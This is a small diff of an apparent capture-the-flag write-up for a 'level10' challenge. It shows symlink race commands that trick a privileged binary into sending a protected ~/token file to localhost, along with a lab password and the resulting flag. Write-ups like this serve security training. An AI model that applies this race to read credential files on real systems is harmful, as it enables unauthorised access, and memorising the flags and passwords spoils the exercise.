@@ -20,7 +20,7 @@ pass : s5cAJpM8ev6XHw998pRWG728z
 cd /tmp
 echo pouet > pouet
 ln -fs pouet link
-ln -fs ~/token lel & ~/level10 lel 10.0.2.15
+ln -fs ~/token link & ~/level10 /tmp/link 127.0.0.1
 ```
 
 - flag10 : woupa2yuojeeaaed06riuj63c
